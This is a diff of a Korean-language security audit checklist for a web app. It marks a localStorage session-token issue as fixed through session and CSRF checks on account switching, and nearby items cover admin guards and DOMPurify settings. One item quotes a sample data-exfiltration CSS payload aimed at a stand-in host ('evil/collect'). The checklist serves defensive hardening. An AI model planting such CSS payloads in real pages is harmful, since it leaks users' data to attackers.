@@ -64,7 +64,7 @@
 
 - [x] **관리자 페이지 인증 가드 누락** — `web/src/app/admin/rules/page.tsx`, `web/src/app/admin/announcements/page.tsx`에만 `user.role` 가드 없음 (다른 admin 12개 페이지는 전부 가드 존재). 백엔드가 거부하므로 피해 제한적이나 방어계층 보강 필요
 - [x] **sanitize 설정 완화** — `web/src/lib/sanitize.ts:5,10,15`에서 `style` 속성 허용. DOMPurify가 `javascript:` CSS는 차단하지만 `background-image:url(https://evil/collect)` 같은 데이터 유출 CSS는 기본 차단 안 함 → `uponSanitizeAttribute` 훅으로 `url(`/`@import`/`expression(`/`-moz-binding`/`behavior:` 포함 style 제거. 앱 코드에는 `background-image`/`url()` CSS 사용처 없음(검색 확인)
-- [ ] **세션 토큰 localStorage 평문 저장** — `web/src/lib/api.ts:6,21`(`storeAccount`), `login/page.tsx:33`, `AccountSwitcher.tsx:92`에서 전 계정 session_token을 localStorage에 저장. HttpOnly 쿠키 기반으로 재검토 (XSS 취약점 1건이면 전 계정 탈취)
+- [x] **세션 토큰 localStorage 평문 저장** — `web/src/lib/api.ts:6,21`(`storeAccount`), `login/page.tsx:33`, `AccountSwitcher.tsx:92`에서 전 계정 session_token을 localStorage에 저장. HttpOnly 쿠키 기반으로 재검토 → 세션 쿠키는 이미 HttpOnly. 남은 위험은 `/auth/switch`가 순수 bearer 토큰을 수용해 탈취 토큰이 타 브라우저에서 재생 가능하던 것 → **switch가 활성 세션 + CSRF 검증 요구**로 변경(라이브 검증: 무세션 401/무CSRF·오류 403/정상 200), 프론트엔드 `switchAccount`에 X-CSRF-Token 헤더 추가. 완전 만료 시 전환은 재로그인 필요
 
 ## MEDIUM
 
